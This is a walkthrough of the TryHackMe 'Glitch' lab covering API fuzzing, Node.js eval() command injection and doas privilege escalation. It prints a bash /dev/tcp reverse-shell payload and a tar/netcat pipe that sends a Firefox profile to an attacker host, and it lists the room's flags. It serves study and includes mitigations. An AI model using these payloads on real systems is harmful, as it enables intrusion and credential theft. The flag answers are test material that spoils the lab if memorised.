# Glitch CTF Walkthrough

**Target:** Glitch
**Source:** [TryHackMe](https://tryhackme.com/room/glitch)
**Difficulty:** Easy
**Target IP:** 10.82.152.95

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web & API Enumeration](#web--api-enumeration)
- [Command Injection in /api/items](#command-injection-in-apiitems)
- [Reverse Shell & Initial Foothold](#reverse-shell--initial-foothold)
- [Firefox Credential Recovery](#firefox-credential-recovery)
- [Second Foothold (v0id)](#second-foothold-v0id)
- [Privilege Escalation via doas](#privilege-escalation-via-doas)
- [Room Answers](#room-answers)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

Glitch is an easy-difficulty Node.js/Express box centered on an undocumented
API endpoint vulnerable to JavaScript `eval`-based command injection. Fuzzing
an unreferenced query parameter exposes raw code execution, which is used to
pop a reverse shell. From there, a Firefox profile pulled off the box via a
manual tar/netcat exfiltration is cracked with `firefox_decrypt` to recover
a second user's password, and a `doas` (GTFOBins) entry provides a direct
path to root.

**Key Skills Required:**
- Web content discovery (`gobuster`)
- API fuzzing (`wfuzz`)
- Node.js `eval()` command injection
- Manual file exfiltration (`tar` + `nc`)
- Firefox credential extraction (`firefox_decrypt`)
- `doas` / GTFOBins privilege escalation

---

## Reconnaissance

### Network Scanning

```bash
nmap -sVC -O 10.82.152.95
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 80/tcp | http | nginx 1.14.0 (Ubuntu) |

A single web service is exposed; enumeration focuses entirely on the HTTP
surface.

---

## Web & API Enumeration

```bash
gobuster dir -u http://10.82.152.95/ -w /usr/share/wordlists/dirb/common.txt
```

```
img                  (Status: 301) [Size: 173] [--> /img/]
js                   (Status: 301) [Size: 171] [--> /js/]
secret               (Status: 200) [Size: 724]
```

`/secret` serves a page whose inline script calls an undocumented API:

```javascript
fetch('/api/access')
  .then((response) => response.json())
  .then((response) => { console.log(response); });
```

```bash
curl http://10.82.152.95/api/access
```

```json
{"token":"dGhpc19pc19ub3RfcmVhbA=="}
```

```bash
echo "dGhpc19pc19ub3RfcmVhbA==" | base64 -d
this_is_not_real
```

> **Q1 — access token:** `this_is_not_real`

Further brute forcing against `/api/` uncovers a second endpoint:

```bash
gobuster dir -u http://10.82.152.95/api -w /usr/share/wordlists/dirb/common.txt
```

```
access               (Status: 200) [Size: 36]
items                (Status: 200) [Size: 169]
```

```bash
curl http://10.82.152.95/api/items
curl -XPOST http://10.82.152.95/api/items
```

```json
{"message":"there_is_a_glitch_in_the_matrix"}
```

The `POST` response hints strongly that the endpoint has a hidden,
unvalidated parameter.

---

## Command Injection in /api/items

A parameter name is fuzzed against `POST /api/items`:

```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -X POST --hh 45 \
  -u http://10.82.152.95/api/items\?FUZZ\=test
```

```
000000915:   500   10 L   64 W   1081 Ch   "cmd"
```

The `cmd` parameter is fed directly into a server-side `eval()` call (per
the Express stack trace in the error response), confirming command/code
injection:

```bash
curl -XPOST http://10.82.152.95/api/items?cmd=whoami
```

```
ReferenceError: whoami is not defined
  at eval (eval at router.post (/var/web/routes/api.js:25:60), <anonymous>:1:1)
```

```bash
curl -XPOST "http://10.82.152.95/api/items?cmd=process.cwd()"
```

```
vulnerability_exploited /var/web
```

---

## Reverse Shell & Initial Foothold

The injection is weaponized via Node's `child_process.exec`:

```
cmd=require("child_process").exec('bash+-c+"bash+-i+>%26+/dev/tcp/<attacker_ip>/1234+0>%261"')
```

Sent as a raw `POST` via Burp Suite with a listener already running:

```bash
rlwrap nc -nvlp 1234
```

```
connect to [<attacker_ip>] from (UNKNOWN) [10.82.152.95] 54994
user@ubuntu:/var/web$ whoami
user
```

```bash
user@ubuntu:~$ cat user.txt
THM{i_don't_know_why}
```

> **Q2 — user.txt contents:** `THM{i_don't_know_why}`

A second user is spotted in `/home`:

```bash
user@ubuntu:/home$ ls
user
v0id
```

---

## Firefox Credential Recovery

The `user` account's Firefox profile directory is tarred and exfiltrated
over a raw `nc` pipe to the attacker machine:

```bash
# attacker
mkdir firefox && cd firefox
nc -l 9009 | tar xf -

# target
tar cf - . | nc <attacker_ip> 9009
```

The profile is decrypted with `firefox_decrypt`:

```bash
git clone https://github.com/unode/firefox_decrypt.git
tar -xf firefox_backup.tar
./firefox_decrypt/firefox_decrypt.py b5w4643p.default-release
```

```
Website:   https://glitch.thm
Username: 'v0id'
Password: 'love_the_void'
```

---

## Second Foothold (v0id)

A PTY upgrade is required before `su` will accept input:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
su v0id
Password: love_the_void
```

```bash
v0id@ubuntu:/home$ whoami
v0id
```

---

## Privilege Escalation via doas

```bash
v0id@ubuntu:/home$ find / -perm -4000 2>/dev/null
```

```
/usr/local/bin/doas
```

`doas` is the OpenBSD `sudo` equivalent; a password-protected rule allows
`v0id` to run a root shell directly:

```bash
doas -u root /bin/sh   # gtfobins
Password: love_the_void
```

```bash
# whoami
root
# cat /root/root.txt
THM{diamonds_break_our_aching_minds}
```

> **Q3 — root.txt contents:** `THM{diamonds_break_our_aching_minds}`

---

## Room Answers

| # | Question | Answer |
|---|----------|--------|
| Q1 | Access token | `this_is_not_real` |
| Q2 | Contents of user.txt | `THM{i_don't_know_why}` |
| Q3 | Contents of root.txt | `THM{diamonds_break_our_aching_minds}` |

---

## Vulnerabilities

### 1. Hardcoded/Base64-"Obscured" API Token (Low)

**Description:** `/api/access` returns a static, base64-encoded token with
no real authentication behind it.

**Impact:** False sense of access control; the token carries no actual
authorization value.

**Mitigation:** Never substitute encoding for authentication; use signed,
short-lived tokens validated server-side.

### 2. Server-Side `eval()` Command Injection (Critical)

**Description:** `POST /api/items` passes an undocumented `cmd` query
parameter directly into a Node.js `eval()` call, allowing arbitrary
JavaScript — and by extension, OS command — execution.

**Impact:** Unauthenticated remote code execution as the web service user.

**Mitigation:**
- Never pass user-controlled input into `eval()`, `Function()`, or similar
  dynamic-execution constructs.
- Validate and allow-list all API parameters; remove undocumented/debug
  endpoints before production.

### 3. Firefox Profile Left on Disk with Saved Credentials (High)

**Description:** A compromised user's Firefox profile contained saved
login credentials for another local account, extractable with a public
tool (`firefox_decrypt`).

**Impact:** Lateral movement from the initial foothold to a second user
account.

**Mitigation:**
- Avoid storing or syncing credentials in browser profiles on shared/server
  systems.
- Use a dedicated secrets manager instead of browser-saved passwords.

### 4. `doas` Rule Enabling Direct Root Shell (Critical)

**Description:** `v0id` has a `doas` rule permitting `/bin/sh` as root, a
documented GTFOBins privilege-escalation primitive.

**Impact:** Full root compromise once `v0id`'s password is known.

**Mitigation:**
- Avoid granting `doas`/`sudo` rights to raw shells.
- Apply least-privilege scoping to any `doas`/`sudo` rule.

---

## Attack Chain Summary

```
Nmap scan → HTTP (nginx) only
    ↓
gobuster → /secret → calls /api/access → base64 token
    ↓
gobuster /api → /api/items (POST) hints at hidden param
    ↓
wfuzz → "cmd" param found → eval() command injection confirmed
    ↓
child_process.exec() reverse shell payload via Burp → foothold: user
    ↓
tar + nc exfil of Firefox profile → firefox_decrypt → v0id:love_the_void
    ↓
su v0id → second foothold
    ↓
find SUID → doas → doas -u root /bin/sh → root
    ↓
Room complete (Q1–Q3 answered)
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/OS detection |
| Gobuster | Hidden directory and API discovery |
| cURL | Fetching web/API content |
| wfuzz | Parameter fuzzing against the API |
| Burp Suite | Crafting the command-injection payload request |
| netcat (nc) / tar | Reverse shell and raw file exfiltration |
| firefox_decrypt | Firefox saved-credential extraction |
| doas (GTFOBins) | Privilege escalation |

---

## References

- [TryHackMe — Glitch](https://tryhackme.com/room/glitch)
- [firefox_decrypt (GitHub)](https://github.com/unode/firefox_decrypt)
- [GTFOBins — doas](https://gtfobins.github.io/gtfobins/doas/)

---
